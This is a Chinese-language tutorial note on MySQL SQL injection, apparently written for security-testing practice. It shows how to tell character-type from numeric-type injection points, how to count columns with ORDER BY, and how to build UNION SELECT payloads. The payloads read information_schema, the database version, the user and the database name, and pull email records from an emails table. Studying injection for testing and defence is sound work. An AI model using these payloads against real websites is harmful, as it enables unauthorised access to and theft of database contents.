# mysql -- 字符型和数值型注入

### 一、定义
        参数被拼接成sql语句时，是否会把参数转化为字符串

### 二、步骤：
1. 确定注入漏洞的类型
     - 主要分为字符型注入和数字注入
     - 判断类型方法
          -  在参数中使用首字母为字符的参数。
             -  如果报错，则为数字注入。
             -  如果没有报错，则为字符型注入点。
                *<font size=2>前提条件：是否报错能否展示在前台页面，否则还是难以判断</font>*
          -  通过录入`1 and 1=1`和`1 and 1=2`来判断。
             -  对于字符型，两者都没有什么改变。因为在MySql中，如果遇到字符型和数值型的的比较会把字符型转化为数字。例如：`‘12aa’` 转换为 `12`, `'bca''`报错。
             -  对于数值型，则会有明显变化。录入`1 and 1=2`时，虽然不会报错，但是逻辑判断错误，所以无法正常展示。
          -  单引号判断法。通过在参数前或者参数添加单引号'。*<font size=2>使用该方法要确保注释掉其他值</font>*
            -  对于字符型，单引号添加在参数后面不会报错，但是添加在参数前则会报错。
            -  对于数值行，添加在参数前或者后都会报错。

2. 确定字段参数
     通过添加`order by 1`语句逐步拆解，如下图所示，当输入`order by 4`时报错。*<font size=2>1代表展示列的第几列，如果数值超出展示列的范围会报错</font>*
     ![avatar](/测试/安全测试/SQL注入/练习/获取参数时报错.png)

3. 分析数据库和数据表的相关信息
   -  在准备阶段，要获取数据的基础信息用来为下一步操作进行准备

   -  对于新版本，使用通过对`information_schema` 表进行查询可以获取整个库的表名。
`id=' union select 1,TABLE_SCHEMA,TABLE_NAME from information_schema.tables limit 16,17%23`
 ![avatar](/测试/安全测试/SQL注入/练习/information_schema.png)

      同理：  
      ` index.php?id=' union select 1,2,version()%23`  获取数据库版本 
      `index.php?id=' union select 1,2,user()%23`  获取数据库用户 
      `index.php?id=' union select 1,database(),version()%23` 获取对应数据库名   

4. 实施具体攻击
通过该语句获取邮箱表或者其他
`index.php?id=' union select 1,email_id,3 from emails limit 0,1;%23`

三、相关变种
1.  参数带有`()`,例如:`$sql = "SELECT * FROM users WHERE id=('$id') LIMIT 0,1";`
2.  判断方案：
    -  使用引号判断法。通过在参数前或者后面添加`'`或`"`,如果报错则会展示出错误内容。根据内容判断。
3.  注入方案：
    - 使用`%23`或`#`注释掉后括号`)`,重新拼接一个新括号`')`或`")`,用来保持原来的语句正常使用。 

